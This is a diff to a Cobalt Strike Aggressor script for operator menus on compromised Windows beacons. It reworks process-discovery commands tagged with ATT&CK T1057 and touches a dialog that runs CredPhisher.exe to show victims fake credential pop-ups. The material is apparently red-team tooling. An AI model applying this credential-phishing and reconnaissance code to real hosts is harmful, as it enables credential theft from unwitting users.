@@ -329,19 +329,11 @@ item "PSW - Active Window Processes  - T1057"{
 		}
 	}
 	
-#PSM - Shows Detailed Information from a specific process id (x86)
-item "PSM - Specified PID Information (x86)  - T1057"{
+#PSM - Shows Detailed Information from a specific process id
+item "PSM - Specified PID Information - T1057"{
 	local ('$bid');
 		foreach $bid ($1){
-			getpsmes($bid);
-		}
-	}
-	
-#PSM - Shows Detailed Information from a specific process id (x64)
-item "PSM - Specified PID Information (x64)  - T1057"{
-	local ('$bid');
-		foreach $bid ($1){
-			getpsmsf($bid);
+			getpsm($bid);
 		}
 	}	
 	
@@ -349,7 +341,7 @@ item "PSM - Specified PID Information (x64)  - T1057"{
 item "PSK - List of Windows Kernel and All Loaded Kernel Modules  - T1057"{
 	local ('$bid');
 		foreach $bid ($1){
-			getpsm($bid);
+			getpsk($bid);
 		}
 	}
 
@@ -497,7 +489,7 @@ fireAlias($1, "netstat");
 #netuser - Not Working
 sub netuser{
 prompt_text("Please Specify A User:", "", lambda({
-bfireAlias($bids, "netuser", "$1");
+fireAlias($bids, "netuser", "$1");
 }, $bids => $1));
 }
 			
@@ -511,7 +503,7 @@ fireAlias($1, "netview");
 #nslookup - Not Working
 sub nslookup{
 prompt_text("Please Specify A HostName:", "", lambda({
-bfireAlias($bids, "nslookup", "$1");
+fireAlias($bids, "nslookup", $1);
 }, $bids => $1));
 }
 
@@ -609,7 +601,7 @@ bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), '"Please Enter Yo
 # Phish Users with custom pop up box
 sub custcredphisher{
  $bid = $1;
-    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(popu => "", execmethod => "Execute-Assembly"), lambda({
+    $dialog = dialog("Phish Users With Custom Pop Up Box", %(popu => "", execmethod => "Execute-Assembly"), lambda({
         $cmdargs = "";
         $cmdargs = "\"$3['popu']\"";
         if ($3["execmethod"] eq "Execute-Assembly"){
@@ -645,26 +637,24 @@ sub getpsw{
 fireAlias($1, "psw");
 }
 	
-#PSM - Shows Detailed Information from a specific process id (x86)
-#sub getpsmes{
-#prompt_text("Please specify a PID", "", lambda({
-#fireAlias($bids, psm), $1 x86);
-#}, $bids => $1);
-#}
+#PSM - Shows Detailed Information from a specific process id
+sub getpsm{
+ $bid = $1;
+    $dialog = dialog("Show Detailed Information From A Specific Process ID", %(pid => "", arc => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['pid'] $3['arc']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Finding Process Information....');
+            fireAlias($bid, "psm", $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Custom Cred Phisher Prompt");
+    drow_text($dialog, "pid",  "Please Enter A Process ID:");
+    drow_combobox($dialog, "arc",  "Please Select The Proper Architecture:", @("x64", "x86"));
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
 
-#PSM - Shows Detailed Information from a specific process id (x64)
-#sub getpsmsf{
-#prompt_text("Please specify a PID", "", lambda({
-#fireAlias($bids, psm), $1 x64);
-#}, $bids => $1);
-#}
-#sub getpsmsf{
-#prompt_text("Please specify a PID", "", lambda({
-#fireAlias($bids, psm, "$1");
-#}, $bids => $1));
-#}
-
-
+}
 
 #PSK - Detailed list of the Windows Kernel and All Loaded Kernel Modules
 sub getpsk{
